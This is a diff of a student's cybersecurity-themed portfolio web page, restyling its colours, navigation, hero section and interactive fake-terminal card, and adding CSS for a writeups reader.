@@ -4,15 +4,15 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Anuraag Mahapatra | Offensive Security &amp; Full-Stack Developer</title>
+    <title>Anuraag Mahapatra | Offensive Security &amp; CTF Developer</title>
     <meta name="description"
-        content="Portfolio of Anuraag Mahapatra — B.Tech Electrical Engineering student at OUTR Bhubaneswar specializing in Offensive Cybersecurity, CTF Development, and Full-Stack Web Development.">
+        content="Portfolio of Anuraag Mahapatra — Offensive Security Enthusiast, CTF Developer, and Full-Stack Web Developer. B.Tech Electrical Engineering at OUTR, Bhubaneswar.">
 
-    <!-- Google Fonts: Space Grotesk, Inter, JetBrains Mono -->
+    <!-- Google Fonts: Inter & JetBrains Mono -->
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
     <link
-        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500;600;700&family=Space+Grotesk:wght@600;700&display=swap"
+        href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600;700&display=swap"
         rel="stylesheet">
 
     <!-- Tailwind CSS CDN -->
@@ -22,145 +22,290 @@
             theme: {
                 extend: {
                     colors: {
-                        obsidian: '#070B14',
-                        navy: '#0D1425',
-                        navyLight: '#131D35',
-                        cyberCyan: '#00F0FF',
-                        cyberEmerald: '#10B981',
+                        obsidian: '#07090f',
+                        panel: '#0d111a',
+                        panelHover: '#121826',
+                        borderDark: '#1e293b',
+                        neonEmerald: '#10b981',
+                        neonCyan: '#22d3ee',
                     },
                     fontFamily: {
-                        display: ['"Space Grotesk"', 'Inter', 'sans-serif'],
-                        sans: ['Inter', 'system-ui', 'sans-serif'],
-                        mono: ['"JetBrains Mono"', 'ui-monospace', 'monospace'],
+                        sans: ['Inter', 'system-ui', '-apple-system', 'sans-serif'],
+                        mono: ['"JetBrains Mono"', 'ui-monospace', 'SFMono-Regular', 'monospace'],
                     },
                     boxShadow: {
-                        'cyan-glow': '0 0 25px -5px rgba(0, 240, 255, 0.25)',
-                        'emerald-glow': '0 0 25px -5px rgba(16, 185, 129, 0.25)',
+                        'emerald-glow': '0 0 28px -6px rgba(16, 185, 129, 0.35)',
+                        'cyan-glow': '0 0 28px -6px rgba(34, 211, 238, 0.30)',
                     }
                 }
             }
-        }
+        };
     </script>
 
-    <!-- Custom Utility & Background Texture Styles -->
+    <!-- Custom Styling & Safe Markdown Prose Rules -->
     <style>
         body {
-            background-color: #070B14;
-            color: #E2E8F0;
+            background-color: #07090f;
+            color: #e2e8f0;
             overflow-x: hidden;
         }
 
-        /* Subtle cyber grid background texture */
+        /* Subtle cyber grid background */
         .cyber-grid {
             background-image:
-                linear-gradient(to right, rgba(0, 240, 255, 0.04) 1px, transparent 1px),
-                linear-gradient(to bottom, rgba(0, 240, 255, 0.04) 1px, transparent 1px);
+                linear-gradient(to right, rgba(34, 211, 238, 0.04) 1px, transparent 1px),
+                linear-gradient(to bottom, rgba(34, 211, 238, 0.04) 1px, transparent 1px);
             background-size: 44px 44px;
         }
 
-        /* Glassmorphic panel surface */
-        .glass-card {
-            background: rgba(13, 20, 37, 0.72);
+        /* Glassmorphic dark card */
+        .cyber-panel {
+            background-color: rgba(13, 17, 26, 0.86);
             backdrop-filter: blur(12px);
             -webkit-backdrop-filter: blur(12px);
-            border: 1px solid rgba(148, 163, 184, 0.14);
+            border: 1px solid #1e293b;
         }
 
-        /* Hover glow for interactive cards */
-        .project-card {
-            transition: transform 0.25s ease, border-color 0.25s ease, box-shadow 0.25s ease;
+        .hover-lift {
+            transition: transform 0.22s ease, border-color 0.22s ease, box-shadow 0.22s ease;
         }
 
-        .project-card:hover {
-            transform: translateY(-4px);
-            border-color: rgba(0, 240, 255, 0.45);
-            box-shadow: 0 12px 32px -10px rgba(0, 240, 255, 0.2);
+        .hover-lift:hover {
+            transform: translateY(-3px);
+            border-color: rgba(34, 211, 238, 0.45);
+            box-shadow: 0 14px 32px -12px rgba(34, 211, 238, 0.2);
         }
 
-        /* Blinking terminal cursor */
-        @keyframes blink {
-            0%, 49% { opacity: 1; }
-            50%, 100% { opacity: 0; }
-        }
-
-        .cursor-blink {
-            animation: blink 1s step-end infinite;
-        }
-
-        /* Active nav link underline */
         .nav-link.active {
-            color: #00F0FF;
+            color: #10b981;
         }
 
-        .nav-link.active::after {
-            content: '';
-            display: block;
-            width: 100%;
-            height: 2px;
-            background: linear-gradient(90deg, #00F0FF, #10B981);
-            margin-top: 2px;
-            border-radius: 9999px;
-        }
-
-        /* Custom subtle scrollbar */
+        /* Custom dark scrollbars */
         ::-webkit-scrollbar {
             width: 8px;
+            height: 8px;
         }
 
         ::-webkit-scrollbar-track {
-            background: #070B14;
+            background: #07090f;
         }
 
         ::-webkit-scrollbar-thumb {
-            background: #1E293B;
+            background: #1e293b;
             border-radius: 9999px;
         }
 
         ::-webkit-scrollbar-thumb:hover {
             background: #334155;
         }
+
+        /* ==================== MARKDOWN READER PROSE ==================== */
+        .md-prose h1 {
+            font-size: 1.7rem;
+            font-weight: 800;
+            color: #f8fafc;
+            margin: 0.25rem 0 1.25rem;
+            padding-bottom: 0.75rem;
+            border-bottom: 1px solid #1e293b;
+            line-height: 1.3;
+        }
+
+        .md-prose h2 {
+            font-size: 1.28rem;
+            font-weight: 700;
+            color: #22d3ee;
+            margin: 1.85rem 0 0.75rem;
+            line-height: 1.35;
+        }
+
+        .md-prose h3 {
+            font-size: 1.08rem;
+            font-weight: 600;
+            color: #10b981;
+            margin: 1.35rem 0 0.5rem;
+        }
+
+        .md-prose p {
+            color: #cbd5e1;
+            line-height: 1.75;
+            margin: 0.75rem 0;
+        }
+
+        .md-prose strong {
+            color: #f8fafc;
+            font-weight: 600;
+        }
+
+        .md-prose em {
+            color: #e2e8f0;
+            font-style: italic;
+        }
+
+        .md-prose a {
+            color: #22d3ee;
+            text-decoration: underline;
+            text-underline-offset: 3px;
+        }
+
+        .md-prose a:hover {
+            color: #10b981;
+        }
+
+        .md-prose ul,
+        .md-prose ol {
+            margin: 0.75rem 0 1.15rem 1.4rem;
+            color: #cbd5e1;
+            line-height: 1.75;
+        }
+
+        .md-prose ul {
+            list-style-type: disc;
+        }
+
+        .md-prose ol {
+            list-style-type: decimal;
+        }
+
+        .md-prose li {
+            margin: 0.4rem 0;
+        }
+
+        .md-prose blockquote {
+            border-left: 3px solid #22d3ee;
+            background-color: rgba(34, 211, 238, 0.06);
+            padding: 0.75rem 1rem;
+            margin: 1rem 0;
+            border-radius: 0 0.75rem 0.75rem 0;
+            color: #e2e8f0;
+        }
+
+        .md-prose hr {
+            border: 0;
+            border-top: 1px solid #1e293b;
+            margin: 1.75rem 0;
+        }
+
+        .md-prose code.inline-code {
+            font-family: 'JetBrains Mono', ui-monospace, monospace;
+            font-size: 0.84em;
+            background-color: #07090f;
+            border: 1px solid rgba(34, 211, 238, 0.25);
+            color: #22d3ee;
+            padding: 0.14rem 0.42rem;
+            border-radius: 0.375rem;
+            word-break: break-word;
+        }
+
+        /* Scrollable code blocks for long JWT / HTTP / cURL payloads */
+        .md-code-block {
+            margin: 1.25rem 0;
+            border-radius: 0.75rem;
+            overflow: hidden;
+            border: 1px solid #1e293b;
+            background-color: #05070c;
+        }
+
+        .md-code-header {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 0.5rem 0.9rem;
+            background-color: #0d111a;
+            border-bottom: 1px solid #1e293b;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.72rem;
+            color: #94a3b8;
+        }
+
+        .md-code-block pre {
+            margin: 0;
+            padding: 1rem 1.1rem;
+            overflow-x: auto;
+            white-space: pre;
+            font-family: 'JetBrains Mono', ui-monospace, monospace;
+            font-size: 0.82rem;
+            line-height: 1.65;
+            color: #e2e8f0;
+            max-width: 100%;
+        }
+
+        .md-code-block pre code {
+            white-space: pre;
+            display: block;
+        }
+
+        .md-figure {
+            margin: 1.25rem 0;
+            border-radius: 0.75rem;
+            overflow: hidden;
+            border: 1px solid #1e293b;
+            background-color: #07090f;
+        }
+
+        .md-figure img {
+            width: 100%;
+            height: auto;
+            display: block;
+            object-fit: contain;
+            background-color: #05070c;
+        }
+
+        .md-figure figcaption {
+            padding: 0.65rem 1rem;
+            border-top: 1px solid #1e293b;
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 0.74rem;
+            color: #94a3b8;
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            gap: 0.5rem;
+            flex-wrap: wrap;
+        }
     </style>
 </head>
 
-<body class="font-sans antialiased selection:bg-cyberCyan/20 selection:text-cyberCyan cyber-grid relative">
+<body class="font-sans antialiased cyber-grid selection:bg-neonCyan/20 selection:text-neonCyan relative min-h-screen flex flex-col">
 
-    <!-- Ambient Radial Glows -->
+    <!-- Ambient Background Glows -->
     <div aria-hidden="true" class="pointer-events-none fixed inset-0 -z-10 overflow-hidden">
-        <div class="absolute -top-40 -left-40 h-96 w-96 rounded-full bg-cyberCyan/10 blur-[120px]"></div>
-        <div class="absolute top-1/3 -right-40 h-96 w-96 rounded-full bg-cyberEmerald/10 blur-[120px]"></div>
-        <div class="absolute bottom-0 left-1/3 h-80 w-80 rounded-full bg-blue-600/10 blur-[120px]"></div>
+        <div class="absolute -top-40 -left-40 h-96 w-96 rounded-full bg-neonEmerald/10 blur-[130px]"></div>
+        <div class="absolute top-1/3 -right-40 h-96 w-96 rounded-full bg-neonCyan/10 blur-[130px]"></div>
+        <div class="absolute bottom-0 left-1/3 h-80 w-80 rounded-full bg-neonEmerald/5 blur-[130px]"></div>
     </div>
 
-    <!-- ==================== STICKY NAVIGATION ==================== -->
-    <header class="sticky top-0 z-50 border-b border-slate-800/80 bg-obsidian/85 backdrop-blur-md">
+    <!-- ==================== STICKY TOP NAVBAR ==================== -->
+    <header class="sticky top-0 z-50 border-b border-borderDark/90 bg-obsidian/90 backdrop-blur-md">
         <div class="mx-auto flex max-w-6xl items-center justify-between px-4 py-3.5 sm:px-6 lg:px-8">
-            <!-- Brand Logo -->
+            <!-- Terminal Brand -->
             <a href="#home" class="group flex items-center gap-2.5 focus:outline-none">
                 <span
-                    class="flex h-9 w-9 items-center justify-center rounded-lg border border-cyberCyan/40 bg-navy font-mono text-sm font-bold text-cyberCyan shadow-cyan-glow transition-transform group-hover:scale-105">
-                    AM
+                    class="flex h-9 w-9 items-center justify-center rounded-lg border border-neonEmerald/40 bg-panel font-mono text-sm font-bold text-neonEmerald shadow-emerald-glow transition-transform group-hover:scale-105">
+                    &gt;_
                 </span>
-                <div class="flex flex-col">
-                    <span class="font-display text-sm font-bold tracking-wide text-white">Anuraag Mahapatra</span>
-                    <span class="font-mono text-[10px] text-cyberEmerald">~/sec-dev</span>
-                </div>
+                <span class="font-mono text-sm font-bold tracking-tight text-white group-hover:text-neonCyan transition">
+                    anuraag@sec:<span class="text-neonEmerald">~</span>$
+                </span>
             </a>
 
-            <!-- Desktop Navigation Links -->
-            <nav aria-label="Primary Navigation" class="hidden items-center gap-7 md:flex">
-                <a href="#home" class="nav-link active text-sm font-medium text-slate-300 transition hover:text-cyberCyan">Home</a>
-                <a href="#about" class="nav-link text-sm font-medium text-slate-300 transition hover:text-cyberCyan">About &amp; Experience</a>
-                <a href="#skills" class="nav-link text-sm font-medium text-slate-300 transition hover:text-cyberCyan">Skills</a>
-                <a href="#projects" class="nav-link text-sm font-medium text-slate-300 transition hover:text-cyberCyan">Projects</a>
-                <a href="#contact"
-                    class="rounded-lg border border-cyberCyan/40 bg-cyberCyan/10 px-4 py-2 font-mono text-xs font-semibold text-cyberCyan transition hover:bg-cyberCyan hover:text-obsidian">
-                    Contact Me
+            <!-- Desktop Navigation -->
+            <nav aria-label="Primary Navigation" class="hidden items-center gap-6 md:flex">
+                <a href="#about" class="nav-link text-sm font-medium text-slate-300 transition hover:text-neonEmerald">About</a>
+                <a href="#skills" class="nav-link text-sm font-medium text-slate-300 transition hover:text-neonEmerald">Skills</a>
+                <a href="#experience" class="nav-link text-sm font-medium text-slate-300 transition hover:text-neonEmerald">Experience</a>
+                <a href="#projects" class="nav-link text-sm font-medium text-slate-300 transition hover:text-neonEmerald">Projects</a>
+                <a href="#writeups"
+                    class="nav-link inline-flex items-center gap-2 rounded-lg border border-neonEmerald/35 bg-neonEmerald/10 px-3 py-1.5 text-sm font-semibold text-neonEmerald transition hover:border-neonCyan hover:bg-neonCyan/10 hover:text-neonCyan">
+                    <span>Writeups</span>
+                    <span id="navWriteupCount"
+                        class="inline-flex h-5 min-w-[20px] items-center justify-center rounded-full bg-neonEmerald px-1.5 font-mono text-[11px] font-bold text-obsidian">1</span>
                 </a>
+                <a href="#contact" class="nav-link text-sm font-medium text-slate-300 transition hover:text-neonCyan">Contact</a>
             </nav>
 
-            <!-- Mobile Menu Toggle Button -->
+            <!-- Mobile Hamburger Button -->
             <button id="mobileMenuBtn" type="button" aria-label="Toggle Menu" aria-expanded="false"
-                class="flex h-10 w-10 items-center justify-center rounded-lg border border-slate-700/80 bg-navy text-slate-200 transition hover:border-cyberCyan hover:text-cyberCyan md:hidden">
+                class="flex h-10 w-10 items-center justify-center rounded-lg border border-borderDark bg-panel text-slate-200 transition hover:border-neonCyan hover:text-neonCyan md:hidden">
                 <svg id="menuIconOpen" class="h-5 w-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
                     <path stroke-linecap="round" stroke-linejoin="round" d="M4 6h16M4 12h16M4 18h16" />
                 </svg>
@@ -170,148 +315,160 @@
             </button>
         </div>
 
-        <!-- Mobile Dropdown Menu -->
-        <div id="mobileMenu" class="hidden border-t border-slate-800 bg-obsidian/95 px-4 py-4 md:hidden">
+        <!-- Mobile Drawer -->
+        <div id="mobileMenu" class="hidden border-t border-borderDark bg-obsidian/95 px-4 py-4 md:hidden">
             <div class="flex flex-col space-y-2">
-                <a href="#home" class="mobile-nav-link rounded-lg px-3 py-2.5 text-sm font-medium text-slate-200 hover:bg-navy hover:text-cyberCyan">Home</a>
-                <a href="#about" class="mobile-nav-link rounded-lg px-3 py-2.5 text-sm font-medium text-slate-200 hover:bg-navy hover:text-cyberCyan">About &amp; Experience</a>
-                <a href="#skills" class="mobile-nav-link rounded-lg px-3 py-2.5 text-sm font-medium text-slate-200 hover:bg-navy hover:text-cyberCyan">Technical Arsenal</a>
-                <a href="#projects" class="mobile-nav-link rounded-lg px-3 py-2.5 text-sm font-medium text-slate-200 hover:bg-navy hover:text-cyberCyan">Featured Projects</a>
-                <a href="#contact" class="mobile-nav-link rounded-lg border border-cyberCyan/30 bg-cyberCyan/10 px-3 py-2.5 text-center font-mono text-sm font-semibold text-cyberCyan">Get in Touch</a>
+                <a href="#about" class="mobile-nav-link rounded-lg px-3 py-2.5 text-sm font-medium text-slate-200 hover:bg-panel hover:text-neonEmerald">About</a>
+                <a href="#skills" class="mobile-nav-link rounded-lg px-3 py-2.5 text-sm font-medium text-slate-200 hover:bg-panel hover:text-neonEmerald">Skills</a>
+                <a href="#experience" class="mobile-nav-link rounded-lg px-3 py-2.5 text-sm font-medium text-slate-200 hover:bg-panel hover:text-neonEmerald">Experience</a>
+                <a href="#projects" class="mobile-nav-link rounded-lg px-3 py-2.5 text-sm font-medium text-slate-200 hover:bg-panel hover:text-neonEmerald">Projects</a>
+                <a href="#writeups"
+                    class="mobile-nav-link flex items-center justify-between rounded-lg border border-neonEmerald/35 bg-neonEmerald/10 px-3 py-2.5 font-mono text-sm font-semibold text-neonEmerald">
+                    <span>Writeups</span>
+                    <span id="mobileWriteupCount"
+                        class="inline-flex h-5 min-w-[20px] items-center justify-center rounded-full bg-neonEmerald px-1.5 text-[11px] font-bold text-obsidian">1</span>
+                </a>
+                <a href="#contact" class="mobile-nav-link rounded-lg px-3 py-2.5 text-sm font-medium text-slate-200 hover:bg-panel hover:text-neonCyan">Contact</a>
             </div>
         </div>
     </header>
 
-    <main>
-        <!-- ==================== HERO SECTION ==================== -->
-        <section id="home" class="relative mx-auto max-w-6xl px-4 pt-14 pb-20 sm:px-6 sm:pt-20 lg:px-8 lg:pt-24 lg:pb-28">
-            <div class="grid grid-cols-1 items-center gap-12 lg:grid-cols-12">
-                <!-- Left Column: Intro & CTAs -->
+    <!-- ==================== MAIN PORTFOLIO VIEW ==================== -->
+    <main id="portfolioView" class="flex-1">
+
+        <!-- 1. HERO SECTION -->
+        <section id="home" class="mx-auto max-w-6xl px-4 pt-12 pb-20 sm:px-6 sm:pt-18 lg:px-8 lg:pt-24 lg:pb-24">
+            <div class="grid grid-cols-1 items-center gap-10 lg:grid-cols-12">
+                <!-- Left Column -->
                 <div class="lg:col-span-7">
-                    <!-- Greeting & Animated Status Badge -->
-                    <div class="mb-5 flex flex-wrap items-center gap-3">
-                        <span class="inline-flex items-center rounded-md border border-slate-700/80 bg-navy/90 px-3 py-1 font-mono text-xs text-cyberCyan">
-                            ~/anuraag-mahapatra
+                    <div class="mb-5 inline-flex items-center gap-2.5 rounded-full border border-neonEmerald/35 bg-neonEmerald/10 px-3.5 py-1.5 font-mono text-xs font-medium text-neonEmerald">
+                        <span class="relative flex h-2 w-2">
+                            <span class="absolute inline-flex h-full w-full animate-ping rounded-full bg-neonEmerald opacity-75"></span>
+                            <span class="relative inline-flex h-2 w-2 rounded-full bg-neonEmerald"></span>
                         </span>
-                        <span class="inline-flex items-center gap-2 rounded-full border border-cyberEmerald/35 bg-cyberEmerald/10 px-3 py-1 font-mono text-[11px] font-medium text-cyberEmerald">
-                            <span class="relative flex h-2 w-2">
-                                <span class="absolute inline-flex h-full w-full animate-ping rounded-full bg-cyberEmerald opacity-75"></span>
-                                <span class="relative inline-flex h-2 w-2 rounded-full bg-cyberEmerald"></span>
-                            </span>
-                            &gt; STATUS: OPEN FOR CYBERSECURITY &amp; FULL-STACK INTERNSHIPS
-                        </span>
+                        Available for Cybersecurity &amp; CTF Developer Internships
                     </div>
 
-                    <!-- Headline -->
-                    <h1 class="font-display text-4xl font-bold tracking-tight text-white sm:text-5xl lg:text-6xl">
-                        Anuraag <span class="bg-gradient-to-r from-cyberCyan to-cyberEmerald bg-clip-text text-transparent">Mahapatra</span>
+                    <h1 class="text-4xl font-extrabold tracking-tight text-white sm:text-5xl lg:text-6xl">
+                        Anuraag <span class="bg-gradient-to-r from-neonEmerald to-neonCyan bg-clip-text text-transparent">Mahapatra</span>
                     </h1>
 
-                    <!-- Role Subtitle -->
-                    <p class="mt-4 font-mono text-sm font-medium text-cyberCyan sm:text-base">
+                    <p class="mt-4 font-mono text-sm font-medium text-neonCyan sm:text-base">
                         Offensive Security Enthusiast &middot; CTF Developer &middot; Full-Stack Web Developer
                     </p>
 
-                    <!-- Bio Blurb -->
-                    <p class="mt-5 max-w-2xl text-base leading-relaxed text-slate-300 sm:text-lg">
-                        Building secure web applications, breaking them to learn, and designing hands-on Capture The Flag experiences.
-                        B.Tech Electrical Engineering student at <span class="font-medium text-white">OUTR, Bhubaneswar</span>, Odisha.
+                    <p class="mt-5 max-w-2xl text-base leading-relaxed text-slate-300">
+                        3rd-year B.Tech Electrical Engineering student at <span class="font-semibold text-white">OUTR, Bhubaneswar</span>.
+                        I build playable Capture The Flag arenas, hunt web vulnerabilities, and engineer security tools &amp; full-stack applications.
                     </p>
 
-                    <!-- Primary CTAs + Social Icon Links -->
-                    <div class="mt-8 flex flex-wrap items-center gap-4">
+                    <!-- CTAs -->
+                    <div class="mt-8 flex flex-wrap items-center gap-3.5">
                         <a href="#projects"
-                            class="inline-flex items-center gap-2 rounded-xl bg-gradient-to-r from-cyberCyan to-cyberEmerald px-6 py-3 text-sm font-bold text-obsidian shadow-cyan-glow transition hover:brightness-110">
-                            Explore Projects
+                            class="inline-flex items-center gap-2 rounded-xl bg-gradient-to-r from-neonEmerald to-neonCyan px-5 py-3 text-sm font-bold text-obsidian shadow-emerald-glow transition hover:brightness-110">
+                            View Projects
                             <svg class="h-4 w-4" fill="none" stroke="currentColor" stroke-width="2.5" viewBox="0 0 24 24">
                                 <path stroke-linecap="round" stroke-linejoin="round" d="M13 7l5 5m0 0l-5 5m5-5H6" />
                             </svg>
                         </a>
-                        <a href="#contact"
-                            class="inline-flex items-center gap-2 rounded-xl border border-slate-700 bg-navy/80 px-6 py-3 text-sm font-semibold text-white transition hover:border-cyberCyan hover:text-cyberCyan">
-                            Get in Touch
+                        <a href="#writeups"
+                            class="inline-flex items-center gap-2 rounded-xl border border-neonEmerald/40 bg-neonEmerald/10 px-5 py-3 font-mono text-xs font-semibold text-neonEmerald transition hover:bg-neonEmerald hover:text-obsidian">
+                            <svg class="h-4 w-4" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
+                                <path stroke-linecap="round" stroke-linejoin="round"
+                                    d="M9 12h6m-6 4h6m2 5H7a2 2 0 01-2-2V5a2 2 0 012-2h5.586a1 1 0 01.707.293l5.414 5.414a1 1 0 01.293.707V19a2 2 0 01-2 2z" />
+                            </svg>
+                            Read Writeups
                         </a>
-
-                        <!-- Quick Social Icons -->
-                        <div class="flex items-center gap-2.5 sm:ml-2">
-                            <a href="https://github.com/Anuraag-Mahapatra" target="_blank" rel="noopener noreferrer" aria-label="GitHub Profile"
-                                class="flex h-11 w-11 items-center justify-center rounded-xl border border-slate-700/80 bg-navy text-slate-300 transition hover:border-cyberCyan hover:text-cyberCyan">
-                                <svg class="h-5 w-5" fill="currentColor" viewBox="0 0 24 24">
-                                    <path fill-rule="evenodd" clip-rule="evenodd"
-                                        d="M12 2C6.477 2 2 6.484 2 12.017c0 4.425 2.865 8.18 6.839 9.504.5.092.682-.217.682-.483 0-.237-.008-.868-.013-1.703-2.782.605-3.369-1.343-3.369-1.343-.454-1.158-1.11-1.466-1.11-1.466-.908-.62.069-.608.069-.608 1.003.07 1.53 1.032 1.53 1.032.892 1.53 2.341 1.088 2.91.832.092-.647.35-1.088.636-1.338-2.22-.253-4.555-1.113-4.555-4.951 0-1.093.39-1.988 1.029-2.688-.103-.253-.446-1.272.098-2.65 0 0 .84-.27 2.75 1.026A9.564 9.564 0 0112 6.844c.85.004 1.705.115 2.504.337 1.909-1.296 2.747-1.027 2.747-1.027.546 1.379.202 2.398.1 2.651.64.7 1.028 1.595 1.028 2.688 0 3.848-2.339 4.695-4.566 4.943.359.309.678.92.678 1.855 0 1.338-.012 2.419-.012 2.747 0 .268.18.58.688.482A10.019 10.019 0 0022 12.017C22 6.484 17.522 2 12 2z" />
-                                </svg>
-                            </a>
-                            <a href="https://www.linkedin.com/in/anuraag-mahapatra-1033b933b" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn Profile"
-                                class="flex h-11 w-11 items-center justify-center rounded-xl border border-slate-700/80 bg-navy text-slate-300 transition hover:border-cyberCyan hover:text-cyberCyan">
-                                <svg class="h-5 w-5" fill="currentColor" viewBox="0 0 24 24">
-                                    <path
-                                        d="M19 3a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V5a2 2 0 0 1 2-2h14m-.5 15.5v-5.3a3.26 3.26 0 0 0-3.26-3.26c-.85 0-1.84.52-2.28 1.3v-1.11h-2.79v8.37h2.79v-4.93c0-.77.62-1.4 1.39-1.4a1.4 1.4 0 0 1 1.4 1.4v4.93h2.75M6.88 8.56a1.68 1.68 0 0 0 1.68-1.68c0-.93-.75-1.69-1.68-1.69a1.69 1.69 0 0 0-1.69 1.69c0 .93.76 1.68 1.69 1.68m1.39 9.94v-8.37H5.5v8.37h2.77z" />
-                                </svg>
-                            </a>
-                            <a href="mailto:a.mahapatra3000@gmail.com" aria-label="Send Email"
-                                class="flex h-11 w-11 items-center justify-center rounded-xl border border-slate-700/80 bg-navy text-slate-300 transition hover:border-cyberEmerald hover:text-cyberEmerald">
-                                <svg class="h-5 w-5" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24">
-                                    <path stroke-linecap="round" stroke-linejoin="round"
-                                        d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
-                                </svg>
-                            </a>
-                        </div>
+                        <a href="#contact"
+                            class="inline-flex items-center gap-2 rounded-xl border border-borderDark bg-panel px-5 py-3 text-sm font-semibold text-slate-200 transition hover:border-neonCyan hover:text-neonCyan">
+                            Contact Me
+                        </a>
                     </div>
                 </div>
 
-                <!-- Right Column: Interactive Terminal Profile Card -->
+                <!-- Right Column: Interactive Terminal Card -->
                 <div class="lg:col-span-5">
-                    <div class="glass-card overflow-hidden rounded-2xl border border-cyberCyan/25 shadow-cyan-glow">
-                        <!-- Terminal Title Bar -->
-                        <div class="flex items-center justify-between border-b border-slate-800 bg-obsidian/90 px-4 py-3">
+                    <div class="cyber-panel overflow-hidden rounded-2xl border border-neonCyan/30 shadow-cyan-glow">
+                        <!-- Terminal Titlebar -->
+                        <div class="flex items-center justify-between border-b border-borderDark bg-obsidian/90 px-4 py-3">
                             <div class="flex items-center gap-2">
                                 <span class="h-3 w-3 rounded-full bg-rose-500/80"></span>
                                 <span class="h-3 w-3 rounded-full bg-amber-400/80"></span>
-                                <span class="h-3 w-3 rounded-full bg-cyberEmerald/80"></span>
+                                <span class="h-3 w-3 rounded-full bg-neonEmerald/80"></span>
                             </div>
-                            <span class="font-mono text-xs text-slate-400">anuraag@outr:~</span>
-                            <span class="font-mono text-[10px] uppercase tracking-wider text-cyberEmerald">bash</span>
+                            <span class="font-mono text-xs text-slate-400">anuraag@sec:~</span>
+                            <span class="font-mono text-[10px] uppercase tracking-wider text-neonEmerald">bash</span>
                         </div>
 
-                        <!-- Terminal Output Area -->
-                        <div id="heroTerminalBody" class="space-y-3 p-5 font-mono text-xs leading-relaxed sm:text-[13px]">
+                        <!-- Terminal Output -->
+                        <div id="termOutput"
+                            class="h-60 space-y-2.5 overflow-y-auto bg-obsidian/70 p-4 font-mono text-xs leading-relaxed text-slate-300">
+                            <p class="text-neonEmerald">Welcome! Type <span class="text-neonCyan">help</span> or click a command chip below.</p>
                             <div>
-                                <span class="text-cyberEmerald">anuraag@outr</span><span class="text-slate-400">:</span><span class="text-cyberCyan">~</span><span class="text-slate-400">$</span>
-                                <span class="ml-1.5 text-white">cat profile.json</span>
+                                <p><span class="text-neonEmerald">anuraag@sec</span>:<span class="text-neonCyan">~</span>$ <span class="text-white">./whoami</span></p>
+                                <p class="mt-1 text-slate-300">Anuraag Mahapatra — B.Tech EE (3rd Yr / 5th Sem) @ OUTR, Bhubaneswar. Offensive Security Practitioner, CTF Author (60+ challenges) &amp; Full-Stack Developer.</p>
                             </div>
-                            <div class="rounded-lg border border-slate-800/80 bg-obsidian/70 p-3.5 text-slate-300">
-                                <p><span class="text-slate-500">{</span></p>
-                                <p class="pl-3"><span class="text-cyberCyan">"whoami"</span>: <span class="text-cyberEmerald">"Anuraag Mahapatra"</span>,</p>
-                                <p class="pl-3"><span class="text-cyberCyan">"location"</span>: <span class="text-amber-300">"Bhubaneswar, Odisha, IN"</span>,</p>
-                                <p class="pl-3"><span class="text-cyberCyan">"focus"</span>: <span class="text-slate-200">["Red Teaming", "CTF Dev", "MERN Stack"]</span>,</p>
-                                <p class="pl-3"><span class="text-cyberCyan">"current_role"</span>: <span class="text-cyberEmerald">"Coordinator &amp; Cyber Mentor @ Energy Club, OUTR"</span></p>
-                                <p><span class="text-slate-500">}</span></p>
+                        </div>
+
+                        <!-- Clickable Command Chips -->
+                        <div class="flex flex-wrap items-center gap-1.5 border-t border-borderDark bg-panel/90 px-4 py-2.5">
+                            <button type="button" data-cmd="./whoami"
+                                class="term-chip rounded-md border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-[11px] text-neonCyan transition hover:border-neonCyan hover:bg-neonCyan/10">./whoami</button>
+                            <button type="button" data-cmd="./ctf_stats"
+                                class="term-chip rounded-md border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-[11px] text-neonEmerald transition hover:border-neonEmerald hover:bg-neonEmerald/10">./ctf_stats</button>
+                            <button type="button" data-cmd="./contact"
+                                class="term-chip rounded-md border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-[11px] text-amber-300 transition hover:border-amber-300 hover:bg-amber-300/10">./contact</button>
+                            <button type="button" data-cmd="ls writeups"
+                                class="term-chip rounded-md border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-[11px] text-purple-300 transition hover:border-purple-400 hover:bg-purple-400/10">ls writeups</button>
+                            <button type="button" data-cmd="clear"
+                                class="term-chip ml-auto rounded-md border border-borderDark bg-obsidian px-2.5 py-1 font-mono text-[11px] text-slate-400 transition hover:border-rose-400 hover:text-rose-400">clear</button>
+                        </div>
+
+                        <!-- Live Input -->
+                        <form id="termForm" class="flex items-center gap-2 border-t border-borderDark bg-obsidian px-4 py-2.5 font-mono text-xs">
+                            <span class="shrink-0 text-neonEmerald">$</span>
+                            <input id="termInput" type="text" autocomplete="off" spellcheck="false"
+                                placeholder="type command (help, ./whoami, ls writeups)..."
+                                class="w-full bg-transparent text-white placeholder-slate-500 focus:outline-none">
+                        </form>
+                    </div>
+                </div>
+            </div>
+        </section>
+
+        <!-- 2. ABOUT SECTION -->
+        <section id="about" class="border-t border-borderDark/80 bg-panel/35 py-20">
+            <div class="mx-auto max-w-6xl px-4 sm:px-6 lg:px-8">
+                <div class="mb-10">
+                    <p class="font-mono text-xs font-semibold uppercase tracking-widest text-neonEmerald">01 // About Me</p>
+                    <h2 class="mt-2 text-3xl font-bold tracking-tight text-white sm:text-4xl">Offensive Mindset &amp; Engineering Depth</h2>
+                </div>
+
+                <div class="cyber-panel rounded-2xl p-6 sm:p-8">
